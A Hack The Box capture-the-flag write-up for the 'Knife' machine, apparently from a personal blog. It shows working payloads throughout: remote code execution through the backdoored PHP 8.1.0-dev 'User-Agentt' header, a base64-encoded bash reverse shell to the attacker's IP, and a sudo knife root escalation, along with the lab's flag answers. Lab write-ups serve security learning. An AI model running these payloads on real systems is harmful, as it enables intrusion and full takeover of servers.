---
title: 'Knife'
date: '2026-09-07'
excerpt: 'Easy - Linux'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Knife</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4">Knife is an easy difficulty Linux machine that features an application which is running on a backdoored version of PHP. This vulnerability is leveraged to obtain the foothold on the server. A sudo misconfiguration is then exploited to gain a root shell.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> How many TCP ports are open on Knife?</p>
<p class="mb-3"></p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.17.50 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-06 22:02 EDT
Nmap scan report for 10.129.17.50
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.04 seconds
```

<p class="mb-5"><strong>Answer:</strong> 2</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> What version of PHP is running on the webserver?</p>
<p class="mb-3">We run <code>curl -I [TARGET_IP]</code> to only output the HTTP response.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ curl -I 10.129.17.50
HTTP/1.1 200 OK
Date: Mon, 07 Sep 2026 02:23:44 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```

<p class="mb-5"><strong>Answer:</strong> 8.1.0-dev</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> What HTTP request header can be added to get code execution in this version of PHP?</p>
<p class="mb-3">Reading Google Search results reveals the answer.</p>
<p class="mb-5"><strong>Answer:</strong> User-Agentt</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> What user is the web server running as?</p>
<p class="mb-3">We can send a cURL request to the target and add <code>-H 'User-Agentt: zerodiumsystem("whoami");'</code>.</p>

```console
No input file specified.
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ curl 10.129.17.50 -H 'User-Agentt: zerodiumsystem("whoami");'
james
<!DOCTYPE html>
<html lang="en" >

<head>

  <meta charset="UTF-8">
 

  <title> Emergent Medical Idea</title>
  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">

  
  
<style>
html,body {
  font-family: 'Raleway', sans-serif;
  padding: 0;
  font-size: 18px;
  /*background: rgb(50, 120, 186);*/
  background: #FFF;
  color: #fff;
}

#menu{
  color: #000;
  max-width: 100%;
  text-align: right;
  font-size: 18px;
  padding: 20px;
  position: relative;
}

#menu ul li{
  display: inline-block;
  margin: 0 5px;
}

#menu ul li:first-child{
  position: absolute;
  top: 0;
  left: 20px;
}

.wrapper{
  max-width: 1000px;
  margin: 0 auto;
}
#heartRate{
  max-width: 500px;
}
.quote{
  max-width: 500px;
  margin-top: 10%;
}

h1,h2 {

  margin: 0.4em 0;
}
h1 { 
  font-size: 3.5em;
  font-weight: 700;

    /* Shadows are visible under slightly transparent text color */
    color: rgba(10,60,150, 0.8);
    text-shadow: 1px 4px 6px #fff, 0 0 0 #000, 1px 4px 6px #fff;
}

h2 {
  color: rgba(10,60,150, 1);
  font-size: 2em;
  font-weight: 200;
}
::-moz-selection { background: #5af; color: #fff; text-shadow: none; }
::selection { background: #5af; color: #fff; text-shadow: none; }
</style>

  <script>
  window.console = window.console || function(t) {};
</script>

  
  
  <script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>


</head>

<body translate="no" >
  <link href="https://fonts.googleapis.com/css?family=Raleway:200,100,700,4004" rel="stylesheet" type="text/css" />
<div id="menu">
  <ul>
    <li></li>
    <li>About EMA</li>
    <li>/</li>
    <li>Patients</li>
    <li>/</li>
    <li>Hospitals</li>
    <li>/</li>
    <li>Providers</li>
    <li>/</li>
    <li>E-MSO</li>
  </ul>
</div>
<div class="wrapper">
<div class ="quote">
<svg version="1.1" id="heartRate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 699 114.3" enable-background="new 0 0 699 114.3" xml:space="preserve">
<path class="pather1" fill="none" stroke="#0A3C96" stroke-width="1" stroke-miterlimit="10" d="M707.9,78c0,0-17.1-0.6-31.1-0.6
	s-30,3.1-31.5,0.6S641,49.3,641,49.3l-10.5,58.5L619.3,7.5c0,0-11.3,66.8-12.5,70.5c0,0-17.1-0.6-31.1-0.6s-30,3.1-31.5,0.6
	s-4.3-28.8-4.3-28.8l-10.5,58.5L518.1,7.5c0,0-11.3,66.8-12.5,70.5c0,0-17.1-0.6-31.1-0.6s-30,3.1-31.5,0.6s-4.3-28.8-4.3-28.8
	l-10.5,58.5L417,7.5c0,0-11.3,66.8-12.5,70.5c0,0-17.1-0.6-31.1-0.6s-30,3.1-31.5,0.6s-4.3-28.8-4.3-28.8l-10.5,58.5L315.9,7.5
	c0,0-11.3,66.8-12.5,70.5c0,0-17.1-0.6-31.1-0.6s-30,3.1-31.5,0.6s-4.3-28.8-4.3-28.8L226,107.8L214.8,7.5c0,0-11.3,66.8-12.5,70.5
	c0,0-17.1-0.6-31.1-0.6s-30,3.1-31.5,0.6s-4.3-28.8-4.3-28.8l-10.5,58.5L113.6,7.5c0,0-11.3,66.8-12.5,70.5c0,0-17.1-0.6-31.1-0.6
	S40,80.5,38.5,78s-4.3-28.8-4.3-28.8l-10.5,58.5L12.5,7.5C12.5,7.5,1.3,74.3,0,78"/>
</svg>

<h2>At EMA we're taking care to a whole new level . . .</h2>
<h1>Taking care of our
  <span
     class="txt-rotate"
     data-period="2000"
     data-rotate='[ "patients.", "hospitals.", "providers." ]'></span>
</h1>
</div>
 </div>
    <script src="https://cpwebassets.codepen.io/assets/common/stopExecutionOnTimeout-157cd5b220a5c80d4ff8e0e70ac069bffd87a61252088146915e8726e5d9f147.js"></script>

  
      <script id="rendered-js" >
var TxtRotate = function (el, toRotate, period) {
  this.toRotate = toRotate;
  this.el = el;
  this.loopNum = 0;
  this.period = parseInt(period, 10) || 2000;
  this.txt = '';
  this.tick();
  this.isDeleting = false;
};

TxtRotate.prototype.tick = function () {
  var i = this.loopNum % this.toRotate.length;
  var fullTxt = this.toRotate[i];

  if (this.isDeleting) {
    this.txt = fullTxt.substring(0, this.txt.length - 1);
  } else {
    this.txt = fullTxt.substring(0, this.txt.length + 1);
  }

  this.el.innerHTML = '<span class="wrap">' + this.txt + '</span>';

  var that = this;
  var delta = 300 - Math.random() * 100;

  if (this.isDeleting) {delta /= 2;}

  if (!this.isDeleting && this.txt === fullTxt) {
    delta = this.period;
    this.isDeleting = true;
  } else if (this.isDeleting && this.txt === '') {
    this.isDeleting = false;
    this.loopNum++;
    delta = 500;
  }

  setTimeout(function () {
    that.tick();
  }, delta);
};


window.onload = function () {
  var elements = document.getElementsByClassName('txt-rotate');
  for (var i = 0; i < elements.length; i++) {if (window.CP.shouldStopExecution(0)) break;
    var toRotate = elements[i].getAttribute('data-rotate');
    var period = elements[i].getAttribute('data-period');
    if (toRotate) {
      new TxtRotate(elements[i], JSON.parse(toRotate), period);
    }
  }
  // INJECT CSS
  window.CP.exitedLoop(0);var css = document.createElement("style");
  css.type = "text/css";
  css.innerHTML = ".txt-rotate > .wrap { border-right: 0.04em solid #666 }";
  document.body.appendChild(css);
};


var path = document.querySelector('path.pather1');
var length = path.getTotalLength();

// Clear any previous transition
path.style.transition = path.style.WebkitTransition =
'none';
// Set up the starting positions
path.style.strokeDasharray = length + ' ' + length;
path.style.strokeDashoffset = -length;
// Trigger a layout so styles are calculated & the browser
// picks up the starting position before animating
path.getBoundingClientRect();
// Define our transition
path.style.transition = path.style.WebkitTransition =
'stroke-dashoffset 4s linear';
// Go!
path.style.strokeDashoffset = '0';
//# sourceURL=pen.js
    </script>

  

</body>

</html>
```

<p class="mb-3">Notice that it also returns the rest of the web page code that we do not need. We can get a concise output when we add on <code>exit;</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ curl 10.129.17.50 -H 'User-Agentt: zerodiumsystem("whoami");exit;'
james
```

<p class="mb-5"><strong>Answer:</strong> james</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> Submit the flag located in the james user's home directory.</p>
<p class="mb-3">Before we attempt a reverse shell connection, we check if the target system can reach us. We enable a Python HTTP server on port 8080 from our local machine, and we send a cURL request from the target's server via the vulnerability.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ curl 10.129.17.50 -H 'User-Agentt: zerodiumsystem("curl 10.10.14.224:8080");'
```

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ sudo python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.17.50 - - [06/Sep/2026 22:36:05] "GET / HTTP/1.1" 200 -
```

<p class="mb-3">To start the reverse shell, we first need to activate Netcat listener on a selected port. Then we connect back to our local machine's IP address and port number. To prevent errors in string and special characters parsing, we first run <code>echo -n "bash -i >& /dev/tcp/[LOCAL_IP]/1337 0>&1" | base64</code> in our local terminal, then use the Base64 encoded output to be decoded in the target's machine to connect back to us.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ curl http://10.129.17.50 -H "User-Agentt: zerodiumsystem('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjQvMTMzNyAwPiYx | base64 -d | bash');die();"
```

<p class="mb-3">Our netcat listener should now have an active reverse shell as james. Reading <code>/home/james/user.txt</code> gives us the flag.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ nc -lvnp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.17.50 60024
bash: cannot set terminal process group (913): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ whoami
whoami
james
james@knife:/$ cd /home && ls -al 
cd /home && ls -al
total 12
drwxr-xr-x  3 root  root  4096 May  6  2021 .
drwxr-xr-x 20 root  root  4096 May 18  2021 ..
drwxr-xr-x  5 james james 4096 May 18  2021 james
james@knife:/home$ cd james && ls -al
cd james && ls -al
total 40
drwxr-xr-x 5 james james 4096 May 18  2021 .
drwxr-xr-x 3 root  root  4096 May  6  2021 ..
lrwxrwxrwx 1 james james    9 May 10  2021 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 james james 3771 Feb 25  2020 .bashrc
drwx------ 2 james james 4096 May  6  2021 .cache
drwxrwxr-x 3 james james 4096 May  6  2021 .local
-rw-r--r-- 1 james james  807 Feb 25  2020 .profile
-rw-rw-r-- 1 james james   66 May  7  2021 .selected_editor
drwx------ 2 james james 4096 May 18  2021 .ssh
-r-------- 1 james james   33 Sep  7 02:05 user.txt
james@knife:~$ cat user.txt
cat user.txt
2152eb9ff55998e08758e4b433145932
james@knife:~$ 
```

<p class="mb-5"><strong>Answer:</strong> 2152eb9ff55998e08758e4b433145932</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> What is the full path to the binary on this machine that james can run as root?</p>
<p class="mb-3">Running <code>sudo -l</code> reveals that james can run <code>/usr/bin/knife</code> as root without password. Knife is a configuration tool for Chef. It has a built-in feature that allows us to execute system commands or open an interactive Ruby shell.</p>

```console
james@knife:/$ sudo -l
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

<p class="mb-5"><strong>Answer:</strong> /usr/bin/knife</p>
<br />


<p class="mb-2"><strong>Question 7:</strong> Submit the flag located in root's home directory.</p>
<p class="mb-3">To privesc to root, we run <code>sudo knife exec -E 'exec "/bin/bash"'</code> and read <code>/root/root.txt</code>.</p>

```console
james@knife:/$ sudo knife exec -E 'exec "/bin/bash"'
sudo knife exec -E 'exec "/bin/bash"'
whoami
root
cd /root && ls -al
total 60
drwx------  7 root root 4096 Sep  7 02:05 .
drwxr-xr-x 20 root root 4096 May 18  2021 ..
lrwxrwxrwx  1 root root    9 May  8  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3137 May  7  2021 .bashrc
drwx------  2 root root 4096 May  7  2021 .cache
drwx------  3 root root 4096 May 18  2021 .chef
-rwxr-xr-x  1 root root  105 May  8  2021 delete.sh
drwxr-xr-x  3 root root 4096 May  7  2021 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root 1024 May  8  2021 .rnd
-r--------  1 root root   33 Sep  7 02:05 root.txt
-rw-r--r--  1 root root   66 May  8  2021 .selected_editor
drwxr-xr-x  3 root root 4096 May  6  2021 snap
drwx------  2 root root 4096 May  6  2021 .ssh
-rw-------  1 root root 4143 Jul 23  2021 .viminfo
cat root.txt
e12b2aeb2d907a7367a4a6659da0bd2f
```

<p class="mb-5"><strong>Answer:</strong> e12b2aeb2d907a7367a4a6659da0bd2f</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>